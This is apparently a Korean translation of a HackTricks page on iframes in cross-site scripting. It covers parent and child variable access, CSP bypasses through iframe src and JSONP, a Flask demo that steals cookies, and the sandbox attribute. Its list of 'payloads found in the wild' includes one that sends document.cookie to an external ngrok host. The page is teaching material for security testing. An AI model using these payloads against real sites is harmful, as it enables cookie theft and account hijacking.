# XSS에서의 Iframes

iframed 페이지의 내용을 나타내는 세 가지 방법이 있습니다:

* `src`를 통해 URL을 나타냄 (URL은 교차 출처 또는 동일 출처일 수 있음)
* `data:` 프로토콜을 사용하여 내용을 나타냄
* 내용을 나타내는 `srcdoc`를 사용함

**부모 및 자식 변수에 액세스하기**
```html
<html>
<script>
var secret = "31337s3cr37t";
</script>

<iframe id="if1" src="http://127.0.1.1:8000/child.html"></iframe>
<iframe id="if2" src="child.html"></iframe>
<iframe id="if3" srcdoc="<script>var secret='if3 secret!'; alert(parent.secret)</script>"></iframe>
<iframe id="if4" src="data:text/html;charset=utf-8,%3Cscript%3Evar%20secret='if4%20secret!';alert(parent.secret)%3C%2Fscript%3E"></iframe>

<script>
function access_children_vars(){
alert(if1.secret);
alert(if2.secret);
alert(if3.secret);
alert(if4.secret);
}
setTimeout(access_children_vars, 3000);
</script>
</html>
```

```html
<!-- content of child.html -->
<script>
var secret="child secret";
alert(parent.secret)
</script>
```
만약 http 서버를 통해 이전의 html에 접근한다면 (`python3 -m http.server`와 같은 방법), 모든 스크립트가 실행되는 것을 알 수 있을 것입니다 (CSP가 방지하지 않기 때문). **부모는 어떤 iframe 내부의 `secret` 변수에 접근할 수 없을 것**이며 **오직 if2 및 if3이라는 동일 사이트로 간주되는 iframes만이 원래 창의 `secret`에 접근할 수 있습니다.**\
if4가 `null` origin을 가지고 있는 것에 주목하세요.

### CSP가 있는 Iframes <a href="#iframes_with_csp_40" id="iframes_with_csp_40"></a>

{% hint style="info" %}
다음 우회 방법에서 주목해야 할 점은, iframed 페이지로의 응답에 JS 실행을 방지하는 CSP 헤더가 포함되어 있지 않다는 것입니다.
{% endhint %}

`script-src`의 `self` 값은 `data:` 프로토콜이나 `srcdoc` 속성을 사용한 JS 코드 실행을 허용하지 않을 것입니다.\
그러나 CSP의 `none` 값조차도 `src` 속성에 URL(전체 또는 경로만)을 넣는 iframes의 실행을 허용할 것입니다.\
따라서 페이지의 CSP를 우회하는 것이 가능합니다.
```html
<html>
<head>
<meta http-equiv="Content-Security-Policy" content="script-src 'sha256-iF/bMbiFXal+AAl9tF8N6+KagNWdMlnhLqWkjAocLsk='">
</head>
<script>
var secret = "31337s3cr37t";
</script>
<iframe id="if1" src="child.html"></iframe>
<iframe id="if2" src="http://127.0.1.1:8000/child.html"></iframe>
<iframe id="if3" srcdoc="<script>var secret='if3 secret!'; alert(parent.secret)</script>"></iframe>
<iframe id="if4" src="data:text/html;charset=utf-8,%3Cscript%3Evar%20secret='if4%20secret!';alert(parent.secret)%3C%2Fscript%3E"></iframe>
</html>
```
이전 CSP는 **인라인 스크립트의 실행만 허용한다는 점에 유의**하십시오.\
그러나 **`if1` 및 `if2` 스크립트만 실행되지만 `if1`만 부모 비밀번호에 액세스할 수 있습니다**.

![](<../../.gitbook/assets/image (372).png>)

따라서, **서버에 JS 파일을 업로드하고 `iframe`을 통해로드하는 경우에도 `script-src 'none'`으로 CSP를 우회할 수 있습니다**. 이것은 **동일 사이트 JSONP 엔드포인트를 남용하여도 가능합니다**.

다음 시나리오로 이를 테스트할 수 있습니다. `script-src 'none'`로 심지어 쿠키가 도용되는 상황입니다. 애플리케이션을 실행하고 브라우저로 액세스하십시오:
```python
import flask
from flask import Flask
app = Flask(__name__)

@app.route("/")
def index():
resp = flask.Response('<html><iframe id="if1" src="cookie_s.html"></iframe></html>')
resp.headers['Content-Security-Policy'] = "script-src 'self'"
resp.headers['Set-Cookie'] = 'secret=THISISMYSECRET'
return resp

@app.route("/cookie_s.html")
def cookie_s():
return "<script>alert(document.cookie)</script>"

if __name__ == "__main__":
app.run()
```
### 야생에서 발견된 다른 페이로드 <a href="#other_payloads_found_on_the_wild_64" id="other_payloads_found_on_the_wild_64"></a>
```html
<!-- This one requires the data: scheme to be allowed -->
<iframe srcdoc='<script src="data:text/javascript,alert(document.domain)"></script>'></iframe>
<!-- This one injects JS in a jsonp endppoint -->
<iframe srcdoc='<script src="/jsonp?callback=(function(){window.top.location.href=`http://f6a81b32f7f7.ngrok.io/cooookie`%2bdocument.cookie;})();//"></script>
<!-- sometimes it can be achieved using defer& async attributes of script within iframe (most of the time in new browser due to SOP it fails but who knows when you are lucky?)-->
<iframe src='data:text/html,<script defer="true" src="data:text/javascript,document.body.innerText=/hello/"></script>'></iframe>
```
### Iframe sandbox

`sandbox` 속성을 사용하여 iframe 내의 콘텐츠에 추가 제한을 적용할 수 있습니다. 기본적으로 이 속성은 적용되지 않으며, 제한이 없는 상태입니다.

`sandbox` 속성을 사용하면 다음과 같은 제한이 부과됩니다:

- 콘텐츠는 고유한 소스에서 비롯된 것으로 처리됩니다.
- 양식 제출 시도가 차단됩니다.
- 스크립트 실행이 금지됩니다.
- 특정 API에 대한 액세스가 비활성화됩니다.
- 링크가 다른 브라우징 컨텍스트와 상호 작용하는 것을 방지합니다.
- `<embed>`, `<object>`, `<applet>` 또는 유사한 태그를 통한 플러그인 사용이 금지됩니다.
- 콘텐츠 자체에 의한 최상위 브라우징 컨텍스트의 탐색이 방지됩니다.
- 비디오 재생이나 양식 컨트롤의 자동 초점 설정과 같은 기능이 차단됩니다.

`sandbox` 속성의 값은 모든 상기 제한을 적용하려면 비워둘 수 있습니다(`sandbox=""`). 또는 특정 제한에서 iframe을 제외하도록 지정된 값의 공백으로 구분된 목록으로 설정할 수도 있습니다.
```html
<iframe src="demo_iframe_sandbox.htm" sandbox></iframe>
```
## SOP에서의 Iframes

다음 페이지를 확인하십시오:

{% content-ref url="../postmessage-vulnerabilities/bypassing-sop-with-iframes-1.md" %}
[bypassing-sop-with-iframes-1.md](../postmessage-vulnerabilities/bypassing-sop-with-iframes-1.md)
{% endcontent-ref %}

{% content-ref url="../postmessage-vulnerabilities/bypassing-sop-with-iframes-2.md" %}
[bypassing-sop-with-iframes-2.md](../postmessage-vulnerabilities/bypassing-sop-with-iframes-2.md)
{% endcontent-ref %}

{% content-ref url="../postmessage-vulnerabilities/blocking-main-page-to-steal-postmessage.md" %}
[blocking-main-page-to-steal-postmessage.md](../postmessage-vulnerabilities/blocking-main-page-to-steal-postmessage.md)
{% endcontent-ref %}

{% content-ref url="../postmessage-vulnerabilities/steal-postmessage-modifying-iframe-location.md" %}
[steal-postmessage-modifying-iframe-location.md](../postmessage-vulnerabilities/steal-postmessage-modifying-iframe-location.md)
{% endcontent-ref %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>에서 **제로**부터 **히어로**까지 AWS 해킹을 배우세요!</summary>

* **사이버 보안 회사**에서 일하시나요? **HackTricks에 귀사를 광고**하고 싶으신가요? 아니면 **PEASS의 최신 버전에 액세스**하거나 HackTricks를 **PDF로 다운로드**하고 싶으신가요? [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 저희의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
* [**공식 PEASS & HackTricks 스왹**](https://peass.creator-spring.com)을 받으세요
* **💬** [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **가입**하거나 **트위터** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**을 팔로우**하세요.
* **해킹 트릭을 공유하려면** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **및** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **에 PR을 제출**하세요.

</details>
